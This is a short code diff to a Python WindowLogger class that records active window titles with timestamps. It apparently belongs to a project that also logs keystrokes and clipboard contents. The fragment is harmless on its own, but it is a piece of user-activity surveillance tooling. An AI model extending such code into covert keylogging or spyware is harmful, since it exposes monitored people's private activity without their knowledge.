@@ -7,6 +7,9 @@
 
 # Library imports here
 import win32gui
+import utility_functions as uf
+import datetime
+import time
 
 
 # Main code here
@@ -36,7 +39,8 @@ class WindowLogger:
     def log_window(self):  # This function follows the exact same format as log_clipboard from keystrokes_and_clipboard_logger. Potential for function?
         self.active_window_and_title_grabber()
         if self.active_window_title != self.last_window_title:
-            self.working_file.write(f"OPENED {self.active_window_title} \n")
+            uf.log_time(self.working_file, time.time())  # Function required, because of conversion.
+            self.working_file.write(f"[OPENED]: {self.active_window_title} \n")
             self.last_window_title = self.active_window_title
 
     def active_window_and_title_grabber(self):
